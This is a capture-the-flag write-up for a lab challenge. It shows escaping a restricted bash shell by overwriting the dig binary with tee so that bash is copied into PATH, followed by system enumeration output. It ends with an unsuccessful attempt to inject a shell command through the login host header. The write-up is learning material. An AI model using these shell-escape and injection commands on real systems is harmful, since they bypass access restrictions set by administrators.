# got root

## Information
The goal consists of finding the flag inside the "/goldnugget/" folder.
There are generally 2 things one has to do to get to that goal:

1. [Breaking out of the restricted Shell](#breaking-out)
2. [Gaining root privileges](#gaining-privileges)


## Breaking out
### First look
First of all, every command including / is blocked, which makes executing things outside of our `PATH` variable theroetically impossible. The `.bashrc` file is read-only, so overwriting that is also not possible, since we can't use `chmod`.
Taking a look at our home directory, this is what `ls -alF .` outputs:
```
drwxr-sr-x    1 restrict restrict        66 Mar 28 15:26 ./
drwxr-xr-x    1 root     root            38 May  4 15:36 ../
-r--r--r--    1 restrict restrict        39 Mar 28 16:02 .bashrc
lrwxrwxrwx    1 restrict restrict         7 Mar 28 15:26 .profile -> .bashrc
drwxr-xr-x    1 restrict restrict        50 Mar 28 15:26 bin/
-rw-r--r--    1 restrict restrict        98 Mar 28 16:02 readme.txt
```

When taking a look at the environment variables, one can see that the PATH variable is set as the `~/bin/"` folder.
That directory contains 3 links and 1 file:

```
drwxr-xr-x    1 restrict restrict        50 Mar 28 15:26 ./
drwxr-sr-x    1 restrict restrict        66 Mar 28 15:26 ../
-rwxr-xr-x    1 restrict restrict    112696 Mar 28 16:02 dig*
lrwxrwxrwx    1 restrict restrict        12 Mar 28 15:26 ls -> /bin/busybox*
lrwxrwxrwx    1 restrict restrict        12 Mar 28 15:26 ping -> /bin/busybox*
lrwxrwxrwx    1 restrict restrict        12 Mar 28 15:26 tee -> /bin/busybox*
```

So, basically the only commands we can use are `ls`, `ping`, `tee` and `dig`.

### Breaking the restriction
> entering this command will break the restriction, fix the `PATH` variable, and will enable you to enter a unrestricted shell by just entering `bash` afterwards.
```sh
echo -n -e '#!/bin/bash\n/bin/cp /bin/bash ~/bin/' | tee bin/dig ; dig ; bash -c "/bin/chmod u+w ~/.bashrc && echo -e 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' | tee  ~/.bashrc"
```

`tee` is able to save the day: we can use that to overwrite the `dig` executable with a own custom shell script! Since we can overwrite the interpreter inside a shell script, we can just use `/bin/bash` to copy any executable that we want to our `PATH` folder.

I think the best possibility is to just copy `/bin/bash` itself, to escape `/bin/rbash`.
This is the command i use to do that kind of exploit:

```sh
echo -n -e '#!/bin/bash\n/bin/cp /bin/bash ~/bin/' | tee bin/dig
```

After running `dig` and taking a look inside our `~/bin/` folder, we can see `bash` show up:
```
99b76d0d-b3db-4817-8d1d-f0a703cf17ea:~$ ls bin
bash  dig   ls    ping  tee
```

After that, we can just use `bash` to escape the rbash shell, and overwrite the .bashrc file to set our `PATH` variable like we want:
```sh
/bin/chmod u+w ~/.bashrc && echo -e 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' | tee ~/.bashrc
```

After exitting the current shell and entering a new one, you are good to go!

## Gaining privileges
### General Analysis
#### Running processes (`ps -a`):
```
PID   USER     TIME  COMMAND
    1 root      0:00 s6-svscan -t0 /var/run/s6/services
   31 root      0:00 s6-supervise s6-fdholderd
  315 root      0:00 s6-supervise resolver
  316 root      0:00 s6-supervise siab
  319 root      0:00 sh ./run
  320 shellina  0:00 /bin/shellinaboxd --debug --no-beep -u shellinabox -g shellinabox -c /var/lib/shellinabox -p 4200 --user-css Normal:+/etc/shellinabox/options-enabled/00_White-On-Black.
  328 go-dnsma  0:00 go-dnsmasq --default-resolver --ndots 1 --fwd-ndots 0 --hostsfile=/etc/hosts
  331 shellina  0:00 /bin/shellinaboxd --debug --no-beep -u shellinabox -g shellinabox -c /var/lib/shellinabox -p 4200 --user-css Normal:+/etc/shellinabox/options-enabled/00_White-On-Black.
  346 root      0:00 login -p -h 10.53.0.1, 81.10.189.200
  347 restrict  0:00 -rbash>linaboxd --debug --no-beep -u shellinabox -g shellinabox -c /var/lib/shellinabox -p 4200 --user-css Normal:+/etc/shellinabox/options-enabled/00_White-On-Black.
  346 root      0:00 login -p -h 10.53.0.1, 81.10.189.200
  347 restrict  0:00 -rbash
  359 restrict  0:00 bash
  362 restrict  0:00 ps -a
```

#### `/etc/passwd` file:
```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/va>:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin>
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
go-dnsmasq:x:1000:1000::/home/go-dnsmasq:/bin/sh
shellinabox:x:1001:1001:Linux User,,,:/home/shellinabox:/bin/ash
hacker:x:2000:2000:Linux User,,,:/home/hacker:/bin/ash
restricted:x:2222:2222:Linux User,,,:/home/restricted:/bin/rbash
```

#### `/etc/group` file:
```
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root>
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
postgres:x:70:
cdrw:x:80:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
go-dnsmasq:x:1000:go-dnsmasq
shellinabox:x:1001:
hacker:x:2000:
restricted:x:2222:
```

### Specific Analysis
Some noteworthy things are the `/.git` folder, and the `/flag-deploy-scripts` folder.
Both folders give us some insight on how this challenge works.

#### .git
Taking a look at the `/.git/config` file tells us, that this challenge has indeed a public github repository, located at [this url](https://github.com/TheHackingLab/gotroot.git). It only has two commits though, and also there isn't really more info to get from there, since the flag is redacted (it was worth a try tho, haha).

#### flag-deploy-scripts
Inside this directory there are two shell scripts. The first one is `deploy-env-flag.sh`:
```sh
#!/usr/bin/with-contenv bash


echo "put your commands to deploy the env based flag here"
echo "the variable \$GOLDNUGGET contains the dynamic flag"
```
I think the code speaks for itself here.
The second file is called `deploy-file-flag.sh`:
```sh
#!/usr/bin/with-contenv bash


echo "put your commands to deploy the file based flag here"
echo "the /goldnugget/*.gn contains the flag"

```
This code also speaks for itself. I also have to say, that these scripts are more likely to be treated like comments.

#### `hacker` account
It's also noteworthy that there seems to be an account named `hacker`, with a group named the same. I don't know what's up to it yet. There's also a connection to the `/etc/hluser` file, which has this content:
```sh
HL_USER_USERNAME=hacker
HL_USER_GROUPNAME=hacker
```

#### Shell in a Box
**Theory 1**  
After connecting to a `shellinaboxd` session, a `login` process gets executed as root, looking as follows:  
`  346 root      0:00 login -p -h 10.53.0.1, 81.10.189.200`  
Maybe this is somehow exploitable? I'm thinking about some sort of code injection, like an SQL injection. But instead it's a bash injection. If I can somehow control these IPs, I could maybe add a "& chown restricted:restricted -r /"?
> This does not work. I tried to spoof the `x-real-ip` header, but it got overwritten by the web server.  
